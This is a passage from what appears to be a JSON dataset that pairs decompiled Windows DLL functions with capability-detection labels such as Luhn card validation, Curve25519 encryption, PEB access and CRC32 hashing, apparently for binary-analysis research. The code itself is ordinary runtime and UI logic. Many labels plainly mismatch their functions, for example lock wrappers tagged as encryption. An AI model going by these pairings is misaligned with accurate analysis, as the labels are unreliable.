        "decompiled_code": "\nint32_t fcn.180050fcc(void)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int32_t iStack24;\n    \n    iStack24 = 0;\n    fcn.18003f700(8);\n    for (iVar3 = 3; iVar3 != *0x180072ff0; iVar3 = iVar3 + 1) {\n        iVar4 = iVar3;\n        iVar1 = *(*0x180072ff8 + iVar4 * 8);\n        if (iVar1 != 0) {\n            if (((*(iVar1 + 0x14) >> 0xd & 1) != 0) &&\n               (iVar2 = fcn.180058e18(*(*0x180072ff8 + iVar4 * 8)),  iVar2 != -1)) {\n                iStack24 = iStack24 + 1;\n            }\n            (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(*(*0x180072ff8 + iVar4 * 8) + 0x30);\n            fcn.18003fb14(*(*0x180072ff8 + iVar4 * 8));\n            *(*0x180072ff8 + iVar4 * 8) = 0;\n        }\n    }\n    fcn.18003f754(8);\n    return iStack24;\n}\n",
        "token_count": 304
    },
    "18001348": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint32_t fcn.180013488(int64_t arg1, uint8_t **arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t **ppuVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    uint64_t uVar11;\n    uint64_t arg1_00;\n    uint32_t uVar12;\n    uint32_t in_R9D;\n    uint32_t uVar13;\n    \n    puVar2 = *arg2;\n    uVar11 = arg3;\n    if (puVar2 == NULL) {\n        puVar8 = fcn.18003c3e8();\n        *puVar8 = 0x16;\n        fcn.18003bf58();\ncode_r0x0001800134fd:\n        if (arg2[1] != NULL) {\n            *arg2[1] = *arg2;\n        }\n        return 0;\n    }\n    if ((arg3 != 0) && (0x22 < arg3 - 2)) {\n        *(arg1 + 0x30) = 1;\n        *(arg1 + 0x2c) = 0x16;\n        fcn.18003be88(0, 0, 0, 0);\n        goto code_r0x0001800134fd;\n    }\n    arg1_00 = *puVar2;\n    *arg2 = puVar2 + 1;\n    if (*(arg1 + 0x28) == '\\0') {\n        fcn.180015220(arg1);\n    }\n    while (iVar6 = fcn.180015910(arg1_00, 8, arg1 + 0x18),  iVar6 != 0) {\n        arg1_00 = **arg2;\n        *arg2 = *arg2 + 1;\n    }\n    uVar12 = in_R9D & 0xff | 2;\n    if (arg1_00 != '-') {\n        uVar12 = in_R9D & 0xff;\n    }\n    if ((arg1_00 - 0x2bU & 0xfd) == 0) {\n        arg1_00 = **arg2;\n        *arg2 = *arg2 + 1;\n    }\n    uVar9 = uVar11;\n    if ((arg3 & 0xffffffef) == 0) {\n        cVar5 = arg1_00;\n        if (cVar5 - 0x30U < 10) {\n            iVar6 = cVar5 + -0x30;\ncode_r0x0001800135b2:\n            if (iVar6 != 0) goto code_r0x000180013603;\n            puVar3 = *arg2;\n            uVar1 = *puVar3;\n            *arg2 = puVar3 + 1;\n            if ((uVar1 + 0xa8 & 0xdf) != 0) {\n                *arg2 = puVar3;\n                uVar9 = 8;\n                if (arg3 != 0) {\n                    uVar9 = uVar11;\n                }\n                if ((uVar1 != 0) && (*puVar3 != uVar1)) {\n                    puVar8 = fcn.18003c3e8();\n                    *puVar8 = 0x16;\n                    fcn.18003bf58();\n                }\n                goto code_r0x00018001360f;\n            }\n            arg1_00 = puVar3[1];\n            *arg2 = puVar3 + 2;\n            uVar9 = 0x10;\n        }\n        else {\n            if (cVar5 + 0x9fU < 0x1a) {\n                iVar6 = cVar5 + -0x57;\n                goto code_r0x0001800135b2;\n            }\n            if (cVar5 + 0xbfU < 0x1a) {\n                iVar6 = cVar5 + -0x37;\n                goto code_r0x0001800135b2;\n            }\ncode_r0x000180013603:\n            uVar9 = 10;\n        }\n        if (arg3 != 0) {\n            uVar9 = uVar11;\n        }\n    }\ncode_r0x00018001360f:\n    uVar13 = 0;\n    while( true ) {\n        uVar1 = arg1_00;\n        if (uVar1 - 0x30 < 10) {\n            uVar10 = uVar1 - 0x30;\n        }\n        else if (uVar1 + 0x9f < 0x1a) {\n            uVar10 = uVar1 - 0x57;\n        }\n        else if (uVar1 + 0xbf < 0x1a) {\n            uVar10 = uVar1 - 0x37;\n        }\n        else {\n            uVar10 = 0xffffffff;\n        }\n        puVar3 = *arg2;\n        if (uVar9 <= uVar10) break;\n        arg1_00 = *puVar3;\n        uVar7 = uVar13 * uVar9;\n        uVar10 = uVar7 + uVar10;\n        *arg2 = puVar3 + 1;\n        uVar12 = uVar12 | (uVar10 < uVar7 || 0xffffffff / uVar9 < uVar13) << 2 | 8;\n        uVar13 = uVar10;\n    }\n    *arg2 = puVar3 + -1;\n    if ((uVar1 != 0) && (puVar3[-1] != uVar1)) {\n        puVar8 = fcn.18003c3e8();\n        *puVar8 = 0x16;\n        fcn.18003bf58();\n    }\n    if ((uVar12 & 8) == 0) {\n        *arg2 = puVar2;\n        if (arg2[1] == NULL) {\n            return 0;\n        }\n        *arg2[1] = puVar2;\n        return 0;\n    }\n    if ((uVar12 & 4) == 0) {\n        if ((uVar12 & 1) == 0) {\n            if ((uVar12 & 2) == 0) goto code_r0x000180013739;\ncode_r0x000180013736:\n            uVar13 = -uVar13;\n            goto code_r0x000180013739;\n        }\n        if ((uVar12 & 2) == 0) {\n            if (uVar13 < 0x80000000) goto code_r0x000180013739;\n        }\n        else if (uVar13 < 0x80000001) goto code_r0x000180013736;\n    }\n    *(arg1 + 0x30) = 1;\n    *(arg1 + 0x2c) = 0x22;\n    if ((uVar12 & 1) != 0) {\n        ppuVar4 = arg2[1];\n        if ((uVar12 & 2) == 0) {\n            if (ppuVar4 != NULL) {\n                *ppuVar4 = *arg2;\n            }\n            return 0x7fffffff;\n        }\n        if (ppuVar4 != NULL) {\n            *ppuVar4 = *arg2;\n        }\n        return 0x80000000;\n    }\n    uVar13 = 0xffffffff;\ncode_r0x000180013739:\n    if (arg2[1] != NULL) {\n        *arg2[1] = *arg2;\n        return uVar13;\n    }\n    return uVar13;\n}\n",
        "token_count": 1737
    },
    "1800166d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800166d8(ulong arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    ulong in_R9;\n    int64_t aiStackX16 [3];\n    \n    aiStackX16[0] = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(0, L\"mscoree.dll\", aiStackX16, in_R9, 0xfffffffffffffffe);\n    if ((iVar2 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(aiStackX16[0], \"CorExitProcess\"),  iVar1 != 0))\n    {\n        (**0x18005d3f8)(arg1);\n    }\n    if (aiStackX16[0] != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)();\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "18003be8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18003be88(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    int64_t iVar3;\n    uint64_t *puVar4;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    \n    iVar3 = fcn.18003bb34(in_stack_00000030);\n    if (((iVar3 == 0) || (*(iVar3 + 0x3b8) == 0)) &&\n       (puVar4 = fcn.18003bc04(0x180072758, in_stack_00000030),  uVar2 = *0x180071010 & 0x3f, \n       ((*0x180071010 ^ *puVar4) >> uVar2 | (*0x180071010 ^ *puVar4) << 0x40 - uVar2) == 0)) {\n        fcn.18003bfa8(arg1, arg2, arg3, arg4, in_stack_00000028);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    (**0x18005d3f8)(arg1, arg2, arg3, arg4, in_stack_00000028);\n    return;\n}\n",
        "token_count": 295
    },
    "180057aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.180057aa4(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t aiStack24 [2];\n    \n    iVar4 = fcn.18004fdc8(arg1 & 0xffffffff);\n    if (iVar4 == -1) {\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 9;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(iVar4, arg2, aiStack24, arg3);\n        if (iVar2 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.18003c3a4(uVar3, arg4);\n        }\n        else if (aiStack24[0] != -1) {\n            puVar1 = *((arg1 >> 6) * 8 + 0x180072bb0) + 0x38 + (arg1 & 0x3f) * 0x48;\n            *puVar1 = *puVar1 & 0xfd;\n            return aiStack24[0];\n        }\n    }\n    return -1;\n}\n",
        "token_count": 304
    },
    "180058c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint fcn.180058c60(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    \n    if (arg1 == 0) {\n        *(arg2 + 0x30) = 1;\n        *(arg2 + 0x2c) = 0x16;\n        fcn.18003be88(0, 0, 0, 0);\n    }\n    else {\n        if ((*(arg1 + 0x14) >> 0xc & 1) == 0) {\n            fcn.180046ec4(arg1);\n            uVar1 = fcn.180058cdc(arg1, arg2);\n            fcn.180046ed0(arg1);\n            return uVar1;\n        }\n        fcn.18005ad44(arg1);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 187
    },
    "180058cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint fcn.180058cdc(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if (arg1 == 0) {\n        *(arg2 + 0x30) = 1;\n        *(arg2 + 0x2c) = 0x16;\n        fcn.18003be88(0, 0, 0, 0);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = 0xffffffff;\n        if ((*(arg1 + 0x14) >> 0xd & 1) != 0) {\n            uVar1 = fcn.180046acc(arg1, arg2);\n            fcn.18005108c(arg1);\n            uVar2 = fcn.180049564(arg1);\n            iVar3 = fcn.18005aa8c(uVar2, arg2);\n            if (iVar3 < 0) {\n                uVar1 = 0xffffffff;\n            }\n            else if (*(arg1 + 0x28) != 0) {\n                fcn.18003fb14(*(arg1 + 0x28));\n                *(arg1 + 0x28) = 0;\n            }\n        }\n        fcn.18005ad44(arg1);\n    }\n    return uVar1;\n}\n",
        "token_count": 306
    },
    "180050b8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.180050b88(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    uint uVar1;\n    uint64_t uVar2;\n    \n    if (arg1 == 0xfffffffe) {\n        *(arg4 + 0x38) = 1;\n        *(arg4 + 0x34) = 0;\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 9;\n    }\n    else {\n        if ((-1 < arg1) && (arg1 < *0x180072fb0)) {\n            uVar2 = arg1 >> 6;\n            if ((*(*(uVar2 * 8 + 0x180072bb0) + 0x38 + (arg1 & 0x3f) * 0x48) & 1) != 0) {\n                fcn.18004fabc(arg1 & 0xffffffff);\n                uVar1 = 0xffffffff;\n                if ((*(*(uVar2 * 8 + 0x180072bb0) + 0x38 + (arg1 & 0x3f) * 0x48) & 1) == 0) {\n                    *(arg4 + 0x30) = 1;\n                    *(arg4 + 0x2c) = 9;\n                    *(arg4 + 0x38) = 1;\n                    *(arg4 + 0x34) = 0;\n                }\n                else {\n                    uVar1 = fcn.180050cb0(arg1, arg2, arg3, arg4);\n                }\n                fcn.18004fba4(arg1);\n                return uVar1;\n            }\n        }\n        *(arg4 + 0x38) = 1;\n        *(arg4 + 0x34) = 0;\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 9;\n        fcn.18003be88(0, 0, 0, 0);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 472
    },
    "18005a86": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.18005a860(ulong noname_0, uint32_t *arg2, uint32_t **arg3, uint32_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t *arg2_00;\n    uint uVar2;\n    \n    fcn.18004fabc(*arg2);\n    uVar1 = **arg3;\n    arg2_00 = arg3[1];\n    if ((*(*((uVar1 >> 6) * 8 + 0x180072bb0) + 0x38 + (uVar1 & 0x3f) * 0x48) & 1) == 0) {\n        *(arg2_00 + 0xc) = 1;\n        arg2_00[0xb] = 9;\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = fcn.18005abe8(uVar1, arg2_00);\n    }\n    fcn.18004fba4(*arg4);\n    return uVar2;\n}\n",
        "token_count": 236
    },
    "18005aa8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18005aa8c(ulong arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    uint32_t auStackX8 [4];\n    uchar auStackX24 [8];\n    uint32_t auStackX32 [2];\n    uint32_t auStack40 [2];\n    uint32_t *puStack32;\n    int64_t iStack24;\n    \n    if (arg1 == 0xfffffffe) {\n        *(arg2 + 0x38) = 1;\n        *(arg2 + 0x34) = 0;\n        *(arg2 + 0x30) = 1;\n        *(arg2 + 0x2c) = 9;\n    }\n    else {\n        auStackX8[0] = arg1;\n        if (((-1 < arg1) && (arg1 < *0x180072fb0)) &&\n           ((*(*((arg1 >> 6) * 8 + 0x180072bb0) + 0x38 + (arg1 & 0x3f) * 0x48) & 1) != 0)) {\n            puStack32 = auStackX8;\n            auStackX32[0] = arg1;\n            auStack40[0] = arg1;\n            iStack24 = arg2;\n            uVar1 = fcn.18005a860(auStackX24, auStack40, &puStack32, auStackX32);\n            return uVar1;\n        }\n        *(arg2 + 0x38) = 1;\n        *(arg2 + 0x34) = 0;\n        *(arg2 + 0x30) = 1;\n        *(arg2 + 0x2c) = 9;\n        fcn.18003be88(0, 0, 0, 0);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 416
    },
    "1800182a": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong fcn.1800182a8(int64_t **arg1)\n\n{\n    uint64_t uVar1;\n    ulong uVar2;\n    uint64_t uVar3;\n    uint64_t *puVar4;\n    uint8_t uVar5;\n    uint64_t *puVar6;\n    uint64_t *puVar7;\n    uint64_t *lpMem;\n    uint64_t uVar8;\n    uint64_t *puVar9;\n    uint64_t *puVar10;\n    \n    uVar1 = *0x180071010;\n    puVar6 = **arg1;\n    if (puVar6 == NULL) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar5 = *0x180071010 & 0x3f;\n        lpMem = (*puVar6 ^ *0x180071010) >> uVar5 | (*puVar6 ^ *0x180071010) << 0x40 - uVar5;\n        puVar6 = (puVar6[1] ^ *0x180071010) >> uVar5 | (puVar6[1] ^ *0x180071010) << 0x40 - uVar5;\n        puVar7 = puVar6;\n        uVar3 = *0x180071010;\n        puVar10 = lpMem;\n        if (lpMem - 1U < 0xfffffffffffffffe) {\n            while (puVar6 = puVar6 + -1,  lpMem <= puVar6) {\n                if (*puVar6 != uVar1) {\n                    *puVar6 = uVar1;\n                    (**0x18005d3f8)();\n                    uVar5 = *0x180071010 & 0x3f;\n                    uVar8 = ***arg1 ^ *0x180071010;\n                    uVar3 = (**arg1)[1] ^ *0x180071010;\n                    puVar9 = uVar8 >> uVar5 | uVar8 << 0x40 - uVar5;\n                    puVar4 = uVar3 >> uVar5 | uVar3 << 0x40 - uVar5;\n                    uVar3 = *0x180071010;\n                    if ((puVar9 != puVar10) || (puVar4 != puVar7)) {\n                        puVar6 = puVar4;\n                        puVar7 = puVar4;\n                        lpMem = puVar9;\n                        puVar10 = puVar9;\n                    }\n                }\n            }\n            if (lpMem != 0xffffffffffffffff) {\n                fcn.18003fb14(lpMem);\n                uVar3 = *0x180071010;\n            }\n            ***arg1 = uVar3;\n            *(**arg1 + 8) = uVar3;\n            *(**arg1 + 0x10) = uVar3;\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 643
    },
    "18004440": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.18004440c(ulong arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    int64_t *piVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    \n    uVar7 = arg1;\n    uVar6 = *0x180071010 ^ *(uVar7 * 8 + 0x180072ab0);\n    uVar3 = *0x180071010 & 0x3f;\n    uVar6 = uVar6 >> uVar3 | uVar6 << 0x40 - uVar3;\n    if (uVar6 != 0xffffffffffffffff) {\n        if (uVar6 != 0) {\n            return uVar6;\n        }\n        if (arg3 != arg4) {\n            do {\n                uVar6 = *arg3;\n                iVar5 = *(uVar6 * 8 + 0x180072a10);\n                if (iVar5 == 0) {\n                    arg1_00 = *(uVar6 * 8 + 0x180060a30);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0);\n                    if ((iVar5 != 0) ||\n                       ((((iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 == 0x57 &&\n                          (iVar4 = fcn.18003ae40(arg1_00, L\"api-ms-\", 7),  iVar4 != 0)) &&\n                         (iVar4 = fcn.18003ae40(arg1_00, L\"ext-ms-\", 7),  iVar4 != 0)) &&\n                        (iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0, 0),  iVar5 != 0)))) {\n                        piVar1 = uVar6 * 8 + 0x180072a10;\n                        iVar2 = *piVar1;\n                        *piVar1 = iVar5;\n                        if (iVar2 != 0) {\n                            (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar5);\n                        }\n                        goto code_r0x000180044591;\n                    }\n                    *(uVar6 * 8 + 0x180072a10) = 0xffffffffffffffff;\n                }\n                else if (iVar5 != -1) {\ncode_r0x000180044591:\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar5, arg2);\n                    if (uVar6 != 0) {\n                        uVar3 = 0x40 - (*0x180071010 & 0x3f) & 0x3f;\n                        *(uVar7 * 8 + 0x180072ab0) = (uVar6 >> uVar3 | uVar6 << 0x40 - uVar3) ^ *0x180071010;\n                        return uVar6;\n                    }\n                    break;\n                }\n                arg3 = arg3 + 1;\n            } while (arg3 != arg4);\n        }\n        uVar3 = 0x40 - (*0x180071010 & 0x3f) & 0x3f;\n        *(uVar7 * 8 + 0x180072ab0) = (0xffffffffffffffffU >> uVar3 | -1 << 0x40 - uVar3) ^ *0x180071010;\n    }\n    return 0;\n}\n",
        "token_count": 802
    },
    "180045d5": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.180045d54(ulong noname_0, uint32_t *arg2, ulong noname_2, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    \n    fcn.18003f700(*arg2);\n    uVar1 = *0x180071010 & 0x3f;\n    uVar2 = *0x180071010 ^ *0x180072fd8;\n    fcn.18003f754(*arg4);\n    return uVar2 >> uVar1 | uVar2 << 0x40 - uVar1;\n}\n",
        "token_count": 142
    },
    "1800464d": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong fcn.1800464dc(ulong arg1)\n\n{\n    ulong uVar1;\n    uint8_t uVar2;\n    \n    uVar2 = *0x180071010 & 0x3f;\n    if (((*0x180071010 ^ *0x180072fe8) >> uVar2 | (*0x180071010 ^ *0x180072fe8) << 0x40 - uVar2) == 0) {\n        return 0;\n    }\n    // WARNING: Could not recover jumptable at 0x00018004650d. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (**0x18005d3f8)(arg1);\n    return uVar1;\n}\n",
        "token_count": 168
    },
    "18004fab": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.18004fabc(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x00018004fadc. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(*((arg1 >> 6) * 8 + 0x180072bb0) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 102
    },
    "18004fba": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.18004fba4(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x00018004fbc4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*((arg1 >> 6) * 8 + 0x180072bb0) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 105
    },
    "180046ec": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180046ec4(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x000180046ec8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 75
    },
    "180046ed": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180046ed0(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x000180046ed4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 76
    },
    "18000167": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000167c(int32_t *arg1, ulong noname_1, ulong noname_2, ulong arg4)\n\n{\n    double dVar1;\n    uint uVar2;\n    double in_XMM1_Qa;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    \n    dVar1 = *0x180068100 - in_XMM1_Qa;\n    uVar4 = SUB84(dVar1, 0);\n    uVar5 = dVar1 >> 0x20;\n    uVar2 = SUB84(in_XMM1_Qa, 0);\n    uVar3 = in_XMM1_Qa >> 0x20;\n    dVar1 = fcn.18001335c(noname_2 * dVar1 + *arg1 * in_XMM1_Qa + *0x1800680f8);\n    *arg1 = dVar1;\n    dVar1 = fcn.18001335c(arg4 * CONCAT44(uVar5, uVar4) + arg1[1] * CONCAT44(uVar3, uVar2) + *0x1800680f8);\n    *(arg1 + 4) = CONCAT44(uVar3, uVar2) * *(arg1 + 4);\n    arg1[1] = dVar1;\n    return;\n}\n",
        "token_count": 298
    },
    "18000172": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001728(int32_t *arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint uVar5;\n    double dVar4;\n    uint uVar6;\n    uint uVar7;\n    ulong in_XMM1_Qa;\n    uint uVar8;\n    double dVar9;\n    double dVar10;\n    \n    uVar7 = in_XMM1_Qa;\n    uVar8 = in_XMM1_Qa >> 0x20;\n    uVar3 = fcn.180012de0(in_XMM1_Qa);\n    uVar1 = uVar3;\n    uVar5 = uVar3 >> 0x20;\n    dVar4 = fcn.180012870(CONCAT44(uVar8, uVar7));\n    uVar2 = SUB84(dVar4, 0);\n    uVar6 = dVar4 >> 0x20;\n    dVar10 = arg1[1] - arg4;\n    dVar9 = *arg1 - arg3;\n    dVar4 = fcn.18001335c(dVar9 * CONCAT44(uVar5, uVar1) + dVar10 * dVar4 + *0x1800680f8);\n    *arg1 = dVar4 + arg3;\n    dVar4 = fcn.18001335c((dVar10 * CONCAT44(uVar5, uVar1) - dVar9 * CONCAT44(uVar6, uVar2)) + *0x1800680f8);\n    *(arg1 + 6) = CONCAT44(uVar8, uVar7) + *(arg1 + 6);\n    arg1[1] = dVar4 + arg4;\n    return;\n}\n",
        "token_count": 400
    },
    "18000184": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.180001848(int64_t *arg1, ulong arg2, ulong noname_2, ulong hGestureInfo)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    double dVar4;\n    uint uStack88;\n    int32_t iStack84;\n    int32_t iStack80;\n    ulong pGestureInfo;\n    ulong var_38h;\n    ulong var_28h;\n    ulong hWnd;\n    \n    uStack88 = 0x38;\n    iVar3 = (*_sym.imp.USER32.dll_GetGestureInfo)(hGestureInfo, &uStack88);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    if (iStack80 == 3) {\n        piVar1 = arg1 + 1;\n        if (iStack84 == 1) {\n            *(arg1 + 3) = var_28h;\n            *piVar1 = var_38h;\n            *(arg1 + 0xc) = var_38h._2_2_;\n            goto code_r0x000180001a98;\n        }\n        piVar2 = arg1 + 2;\n        *piVar2 = var_38h;\n        *(arg1 + 0x14) = var_38h._2_2_;\n        (*_sym.imp.USER32.dll_ScreenToClient)(arg2, piVar2);\n        (**(*arg1 + 0x18))(*(arg1 + 3), var_28h / *(arg1 + 3), arg1, *arg1, (*piVar1 + *piVar2) / 2, \n                           (*(arg1 + 0x14) + *(arg1 + 0xc)) / 2);\n        (*_sym.imp.USER32.dll_InvalidateRect)(arg2, 0, 1);\n        *piVar1 = *piVar2;\n    }\n    else {\n        if (iStack80 == 4) {\n            piVar1 = arg1 + 1;\n            if (iStack84 != 1) {\n                piVar2 = arg1 + 2;\n                *piVar2 = var_38h;\n                *(arg1 + 0x14) = var_38h._2_2_;\n                (*_sym.imp.USER32.dll_ScreenToClient)(arg2, piVar2);\n                (**(*arg1 + 0x20))(arg1, *piVar2 - *piVar1, *(arg1 + 0x14) - *(arg1 + 0xc));\n                (*_sym.imp.USER32.dll_InvalidateRect)(arg2, 0, 1);\n                *piVar1 = *piVar2;\n                goto code_r0x000180001aa1;\n            }\n            *piVar1 = var_38h;\n            *(arg1 + 0xc) = var_38h._2_2_;\ncode_r0x000180001a98:\n            (*_sym.imp.USER32.dll_ScreenToClient)(arg2, arg1 + 1);\n            goto code_r0x000180001aa1;\n        }\n        if (iStack80 != 5) {\n            if (iStack80 == 6) {\n                (**(*arg1 + 0x10))(arg1);\n            }\n            else {\n                if ((iStack80 != 7) || (iStack84 != 1)) goto code_r0x000180001aa1;\n                (**(*arg1 + 8))(arg1);\n            }\n            (*_sym.imp.USER32.dll_InvalidateRect)(arg2, 0, 1);\n            goto code_r0x000180001aa1;\n        }\n        if (iStack84 == 1) {\n            *(arg1 + 3) = 0;\n            goto code_r0x000180001aa1;\n        }\n        piVar1 = arg1 + 1;\n        *piVar1 = var_38h;\n        *(arg1 + 0xc) = var_38h._2_2_;\n        (*_sym.imp.USER32.dll_ScreenToClient)(arg2, piVar1);\n        dVar4 = (*(arg1 + 3) / *0x180068120) * *0x180068110 * *0x180068108 - *0x180068118;\n        (**(*arg1 + 0x28))(dVar4, ((var_28h / *0x180068120) * *0x180068110 * *0x180068108 - *0x180068118) - dVar4, arg1\n                           , *arg1, *piVar1, *(arg1 + 0xc));\n        (*_sym.imp.USER32.dll_InvalidateRect)(arg2, 0, 1);\n    }\n    *(arg1 + 3) = var_28h;\ncode_r0x000180001aa1:\n    (*_sym.imp.USER32.dll_CloseGestureInfoHandle)(hGestureInfo);\n    return 1;\n}\n",
        "token_count": 1101
    },
    "180001ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
